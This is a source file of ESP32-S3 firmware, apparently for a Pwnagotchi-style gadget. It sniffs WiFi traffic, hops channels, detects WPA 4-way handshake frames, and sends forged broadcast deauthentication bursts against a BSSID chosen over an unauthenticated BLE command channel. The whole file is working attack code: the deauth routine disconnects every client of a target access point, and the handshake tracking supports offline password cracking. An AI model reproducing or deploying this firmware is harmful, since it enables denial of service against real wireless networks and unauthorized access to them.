// pwnagotchi-esp32s3 — standalone "dumb radio" firmware
// The chip does WiFi sniffing + deauth + channel hopping. All intelligence
// (mood, hunger, diary, faces) lives in the React Native app, which connects
// over BLE.
//
// BLE GATT layout
//   service 0000bee5-0000-1000-8000-00805f9b34fb
//     bee6  STATUS   read + notify  (12 bytes packed, see PwnStatus)
//     bee7  EVENT    notify         (variable, first byte = event type)
//     bee8  CONTROL  write          (first byte = command, rest = payload)
//
// Build
//   arduino-cli lib install "NimBLE-Arduino"
//   arduino-cli compile --fqbn esp32:esp32:esp32s3 \
//     --build-property "build.partitions=min_spiffs" pwnagotchi-esp32s3

#include <Arduino.h>
#include <NimBLEDevice.h>
#include <esp_wifi.h>
#include <esp_event.h>
#include <esp_err.h>
#include <esp_log.h>
#include <string.h>

// ─── config ──────────────────────────────────────────────────────────────
#define DEVICE_NAME_PREFIX "pwn-"

#define PWN_SVC_UUID     "0000bee5-0000-1000-8000-00805f9b34fb"
#define PWN_STATUS_UUID  "0000bee6-0000-1000-8000-00805f9b34fb"
#define PWN_EVENT_UUID   "0000bee7-0000-1000-8000-00805f9b34fb"
#define PWN_CONTROL_UUID "0000bee8-0000-1000-8000-00805f9b34fb"

static const uint32_t STATUS_PUSH_MS = 1000;
static const uint32_t CHAN_HOP_MS    = 350;
static const uint32_t NETWORK_TTL_MS = 90000;
static const size_t   MAX_NETWORKS   = 64;

// Per-BSSID handshake accumulator. We consider a handshake complete when we
// have seen at least messages 1 and 2 from the 4-way exchange.
struct HsBuilder {
    uint8_t bssid[6];
    uint8_t msg_mask;   // bit 0 = M1, bit 1 = M2, bit 2 = M3, bit 3 = M4
    uint32_t last_seen;
};
static const size_t MAX_HS_BUILDERS = 16;

// ─── runtime state ───────────────────────────────────────────────────────
enum PwnMode : uint8_t { MODE_IDLE = 0, MODE_SCAN = 1, MODE_HUNT = 2, MODE_SLEEP = 3 };
enum PwnCmd : uint8_t  {
    CMD_SET_MODE    = 0x01,
    CMD_SET_CHANNEL = 0x02,
    CMD_DEAUTH      = 0x03,
    CMD_WIPE_HS     = 0x06,
    CMD_REBOOT      = 0xFF,
};

#pragma pack(push, 1)
struct PwnStatus {
    uint32_t uptime_sec;
    uint16_t hs_count;
    uint16_t net_count;
    uint8_t  channel;
    uint8_t  mode;       // PwnMode
    uint8_t  flags;      // bit 0 = ble_connected
    uint8_t  reserved;
};
#pragma pack(pop)
static_assert(sizeof(PwnStatus) == 12, "PwnStatus must be 12 bytes");

struct NetEntry {
    uint8_t bssid[6];
    char    ssid[33];
    int8_t  rssi;
    uint8_t channel;
    uint32_t last_seen;
};

static NetEntry      g_nets[MAX_NETWORKS];
static size_t        g_net_count = 0;
static HsBuilder     g_hs[MAX_HS_BUILDERS];
static volatile uint16_t g_hs_count = 0;
static uint8_t       g_current_channel = 1;
static uint8_t       g_locked_channel  = 0; // 0 = hopping, else stay on this
static volatile bool g_ble_connected   = false;
static PwnMode       g_mode            = MODE_SCAN;
static uint32_t      g_last_hop_ms     = 0;
static uint32_t      g_last_status_ms  = 0;
static uint32_t      g_last_hs_pushed  = 0;
static uint32_t      g_boot_ms         = 0;

static NimBLECharacteristic *status_chr  = nullptr;
static NimBLECharacteristic *event_chr   = nullptr;
static NimBLECharacteristic *control_chr = nullptr;

// Lock-free queue between sniffer ISR and main loop. We only stash brief
// summaries; no malloc / String / Serial.print inside the callback.
struct SnifEvent {
    enum Kind : uint8_t { KIND_BEACON, KIND_HS_FRAME } kind;
    int8_t   rssi;
    uint8_t  channel;
    uint8_t  bssid[6];
    uint8_t  payload_len;
    uint8_t  payload[40];   // SSID for beacons; first 40 bytes of EAPOL frame for HS
};
static const size_t QUEUE_SIZE = 32;
static SnifEvent g_queue[QUEUE_SIZE];
static volatile size_t g_q_head = 0, g_q_tail = 0;

static bool q_push(const SnifEvent &ev) {
    size_t next = (g_q_head + 1) % QUEUE_SIZE;
    if (next == g_q_tail) return false; // full → drop
    g_queue[g_q_head] = ev;
    g_q_head = next;
    return true;
}
static bool q_pop(SnifEvent &out) {
    if (g_q_tail == g_q_head) return false;
    out = g_queue[g_q_tail];
    g_q_tail = (g_q_tail + 1) % QUEUE_SIZE;
    return true;
}

// ─── helpers ─────────────────────────────────────────────────────────────
static bool mac_eq(const uint8_t a[6], const uint8_t b[6]) {
    return memcmp(a, b, 6) == 0;
}
static void mac_cpy(uint8_t dst[6], const uint8_t src[6]) {
    memcpy(dst, src, 6);
}

static NetEntry *find_or_create_net(const uint8_t bssid[6]) {
    for (size_t i = 0; i < g_net_count; i++)
        if (mac_eq(g_nets[i].bssid, bssid)) return &g_nets[i];
    if (g_net_count < MAX_NETWORKS) {
        NetEntry *e = &g_nets[g_net_count++];
        memset(e, 0, sizeof(*e));
        mac_cpy(e->bssid, bssid);
        return e;
    }
    // evict oldest
    size_t oldest = 0;
    for (size_t i = 1; i < g_net_count; i++)
        if (g_nets[i].last_seen < g_nets[oldest].last_seen) oldest = i;
    memset(&g_nets[oldest], 0, sizeof(g_nets[oldest]));
    mac_cpy(g_nets[oldest].bssid, bssid);
    return &g_nets[oldest];
}

static HsBuilder *find_or_create_hs(const uint8_t bssid[6]) {
    int free_slot = -1;
    uint32_t now = millis();
    for (int i = 0; i < (int)MAX_HS_BUILDERS; i++) {
        if (mac_eq(g_hs[i].bssid, bssid) && g_hs[i].msg_mask != 0) return &g_hs[i];
        if (g_hs[i].msg_mask == 0 && free_slot < 0) free_slot = i;
        if (g_hs[i].msg_mask != 0 && now - g_hs[i].last_seen > 30000) {
            g_hs[i].msg_mask = 0;     // expire stale partial captures
            if (free_slot < 0) free_slot = i;
        }
    }
    if (free_slot < 0) return nullptr;
    HsBuilder *b = &g_hs[free_slot];
    memset(b, 0, sizeof(*b));
    mac_cpy(b->bssid, bssid);
    return b;
}

static void prune_old_networks() {
    uint32_t now = millis();
    size_t w = 0;
    for (size_t r = 0; r < g_net_count; r++) {
        if (now - g_nets[r].last_seen <= NETWORK_TTL_MS) {
            if (w != r) g_nets[w] = g_nets[r];
            w++;
        }
    }
    g_net_count = w;
}

// ─── sniffer ─────────────────────────────────────────────────────────────
static void IRAM_ATTR sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return; // minimum 802.11 header

    const uint8_t fc0 = p[0];
    const uint8_t subtype = (fc0 >> 4) & 0x0F;
    const uint8_t ftype   = (fc0 >> 2) & 0x03;

    SnifEvent ev = {};
    ev.rssi = pkt->rx_ctrl.rssi;
    ev.channel = pkt->rx_ctrl.channel;

    // Management frames: beacon (8) or probe response (5)
    if (ftype == 0 && (subtype == 8 || subtype == 5)) {
        // bssid = address 3 (offset 16)
        mac_cpy(ev.bssid, p + 16);
        // Tagged params start at offset 36; first tag should be SSID (id=0)
        if (pkt->rx_ctrl.sig_len < 38) return;
        const uint8_t *tag = p + 36;
        if (tag[0] != 0) return; // not SSID
        uint8_t slen = tag[1];
        if (slen > 32) slen = 32;
        if (36 + 2 + slen > pkt->rx_ctrl.sig_len) return;
        ev.kind = SnifEvent::KIND_BEACON;
        ev.payload_len = slen;
        memcpy(ev.payload, tag + 2, slen);
        q_push(ev);
        return;
    }

    // Data frames: look for EAPOL signature in LLC/SNAP header.
    // 802.11 hdr length depends on flags; for QoS Data it's 26 bytes.
    if (ftype == 2) {
        size_t hdr_len = 24;
        if ((fc0 & 0x80) != 0) hdr_len = 26; // QoS data
        if (pkt->rx_ctrl.sig_len < hdr_len + 8) return;
        const uint8_t *llc = p + hdr_len;
        // LLC: AA AA 03 00 00 00 / EtherType 0x888E (EAPOL)
        if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
        if (llc[6] != 0x88 || llc[7] != 0x8E) return;
        // BSSID is address 1 or 3 depending on ToDS/FromDS bits in fc[1]
        const uint8_t fc1 = p[1];
        const uint8_t *bssid = nullptr;
        if (fc1 & 0x01) bssid = p + 4;        // toDS  → addr1 = BSSID
        else if (fc1 & 0x02) bssid = p + 10;  // fromDS → addr2 = BSSID
        else bssid = p + 16;
        mac_cpy(ev.bssid, bssid);
        ev.kind = SnifEvent::KIND_HS_FRAME;
        size_t copy = pkt->rx_ctrl.sig_len - hdr_len - 8;
        if (copy > sizeof(ev.payload)) copy = sizeof(ev.payload);
        ev.payload_len = (uint8_t)copy;
        memcpy(ev.payload, p + hdr_len + 8, copy);
        q_push(ev);
    }
}

// EAPOL key frame: see IEEE 802.1X. Bytes 1-3 = packet type (0x03=key),
// byte 5 onward is key info. We just use the Key Info field (bytes 5-6)
// to figure out which message of the 4-way handshake this is.
static uint8_t eapol_message_number(const uint8_t *data, size_t len) {
    if (len < 8) return 0;
    if (data[1] != 0x03) return 0;            // not EAPOL-Key
    uint16_t key_info = (data[5] << 8) | data[6];
    bool install   = key_info & 0x0040;
    bool ack       = key_info & 0x0080;
    bool mic       = key_info & 0x0100;
    bool secure    = key_info & 0x0200;
    if (!mic && ack && !install) return 1;
    if (mic && !ack && !install && !secure) return 2;
    if (mic && ack && install) return 3;
    if (mic && !ack && !install && secure) return 4;
    return 0;
}

static void process_sniff_queue() {
    SnifEvent ev;
    while (q_pop(ev)) {
        if (ev.kind == SnifEvent::KIND_BEACON) {
            NetEntry *n = find_or_create_net(ev.bssid);
            if (!n) continue;
            n->rssi    = ev.rssi;
            n->channel = ev.channel;
            n->last_seen = millis();
            size_t slen = ev.payload_len;
            if (slen > 32) slen = 32;
            memcpy(n->ssid, ev.payload, slen);
            n->ssid[slen] = 0;
            continue;
        }
        if (ev.kind == SnifEvent::KIND_HS_FRAME) {
            uint8_t msg = eapol_message_number(ev.payload, ev.payload_len);
            if (msg == 0) continue;
            HsBuilder *b = find_or_create_hs(ev.bssid);
            if (!b) continue;
            uint8_t bit = 1 << (msg - 1);
            bool was_complete = (b->msg_mask & 0x03) == 0x03; // had M1+M2 already
            b->msg_mask |= bit;
            b->last_seen = millis();
            bool now_complete = (b->msg_mask & 0x03) == 0x03;
            if (!was_complete && now_complete) {
                g_hs_count++;
                // Fire BLE event with [0x10][ch][bssid:6][ssid_len][ssid]
                if (g_ble_connected && event_chr) {
                    NetEntry *net = find_or_create_net(ev.bssid);
                    uint8_t buf[64];
                    size_t i = 0;
                    buf[i++] = 0x10;
                    buf[i++] = ev.channel;
                    for (int k = 0; k < 6; k++) buf[i++] = ev.bssid[k];
                    uint8_t slen = net ? (uint8_t)strnlen(net->ssid, 32) : 0;
                    buf[i++] = slen;
                    if (slen && net) memcpy(&buf[i], net->ssid, slen);
                    i += slen;
                    event_chr->setValue(buf, i);
                    event_chr->notify();
                }
            }
        }
    }
}

// ─── deauth ──────────────────────────────────────────────────────────────
static uint8_t deauth_target[6] = {0};
static bool    deauth_armed = false;

static uint8_t deauth_frame[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dst = broadcast (overwritten)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src = bssid
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid
    0x00, 0x00,
    0x07, 0x00 // reason: class 3 frame received from non-associated station
};

static void fire_deauth_burst() {
    if (!deauth_armed) return;
    memcpy(deauth_frame + 10, deauth_target, 6); // src
    memcpy(deauth_frame + 16, deauth_target, 6); // bssid
    // broadcast destination — sends to all clients of the AP
    memset(deauth_frame + 4, 0xFF, 6);
    for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        delay(2);
    }
}

// ─── BLE ─────────────────────────────────────────────────────────────────
class ServerCallbacks : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer *, NimBLEConnInfo &) override    { g_ble_connected = true;  }
    void onDisconnect(NimBLEServer *, NimBLEConnInfo &, int) override {
        g_ble_connected = false;
        NimBLEDevice::startAdvertising();
    }
};

class ControlCallbacks : public NimBLECharacteristicCallbacks {
    void onWrite(NimBLECharacteristic *chr, NimBLEConnInfo &) override {
        std::string v = chr->getValue();
        if (v.empty()) return;
        const uint8_t *d = (const uint8_t *)v.data();
        switch (d[0]) {
        case CMD_SET_MODE:
            if (v.size() >= 2) g_mode = (PwnMode)d[1];
            break;
        case CMD_SET_CHANNEL:
            if (v.size() >= 2 && d[1] >= 1 && d[1] <= 13) {
                g_locked_channel = d[1];
                g_current_channel = d[1];
                esp_wifi_set_channel(d[1], WIFI_SECOND_CHAN_NONE);
            } else {
                g_locked_channel = 0;
            }
            break;
        case CMD_DEAUTH:
            if (v.size() >= 7) {
                memcpy(deauth_target, d + 1, 6);
                deauth_armed = true;
            }
            break;
        case CMD_WIPE_HS:
            g_hs_count = 0;
            for (auto &b : g_hs) b.msg_mask = 0;
            break;
        case CMD_REBOOT:
            ESP.restart();
            break;
        }
    }
};

static void ble_setup() {
    uint8_t mac[6];
    esp_efuse_mac_get_default(mac);
    char name[16];
    snprintf(name, sizeof(name), "%s%02X%02X%02X", DEVICE_NAME_PREFIX, mac[3], mac[4], mac[5]);

    NimBLEDevice::init(name);
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEServer *server = NimBLEDevice::createServer();
    server->setCallbacks(new ServerCallbacks());

    NimBLEService *svc = server->createService(PWN_SVC_UUID);
    status_chr  = svc->createCharacteristic(PWN_STATUS_UUID, NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY);
    event_chr   = svc->createCharacteristic(PWN_EVENT_UUID,  NIMBLE_PROPERTY::NOTIFY);
    control_chr = svc->createCharacteristic(PWN_CONTROL_UUID, NIMBLE_PROPERTY::WRITE);
    control_chr->setCallbacks(new ControlCallbacks());
    svc->start();

    NimBLEAdvertising *adv = NimBLEDevice::getAdvertising();
    adv->addServiceUUID(PWN_SVC_UUID);
    adv->setName(name);
    adv->start();
}

// ─── wifi ────────────────────────────────────────────────────────────────
static void wifi_setup() {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&sniffer_cb);
    wifi_promiscuous_filter_t filt = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE);
}

static void channel_hop() {
    if (g_mode != MODE_SCAN || g_locked_channel != 0) return;
    uint32_t now = millis();
    if (now - g_last_hop_ms < CHAN_HOP_MS) return;
    g_last_hop_ms = now;
    g_current_channel++;
    if (g_current_channel > 13) g_current_channel = 1;
    esp_wifi_set_channel(g_current_channel, WIFI_SECOND_CHAN_NONE);
}

// ─── status push ─────────────────────────────────────────────────────────
static void push_status() {
    if (!status_chr) return;
    PwnStatus s = {};
    s.uptime_sec = (millis() - g_boot_ms) / 1000;
    s.hs_count   = g_hs_count;
    s.net_count  = (uint16_t)g_net_count;
    s.channel    = g_current_channel;
    s.mode       = (uint8_t)g_mode;
    s.flags      = g_ble_connected ? 0x01 : 0x00;
    status_chr->setValue((uint8_t *)&s, sizeof(s));
    if (g_ble_connected) status_chr->notify();
}

// ─── arduino entry ───────────────────────────────────────────────────────
void setup() {
    Serial.begin(115200);
    delay(200);
    Serial.println("\n[pwn] boot");
    g_boot_ms = millis();
    memset(g_hs, 0, sizeof(g_hs));
    ble_setup();
    wifi_setup();
    Serial.println("[pwn] ready");
}

void loop() {
    process_sniff_queue();
    channel_hop();
    if (g_mode == MODE_HUNT && deauth_armed) fire_deauth_burst();

    uint32_t now = millis();
    if (now - g_last_status_ms > STATUS_PUSH_MS) {
        g_last_status_ms = now;
        push_status();
        prune_old_networks();
    }
    delay(2);
}
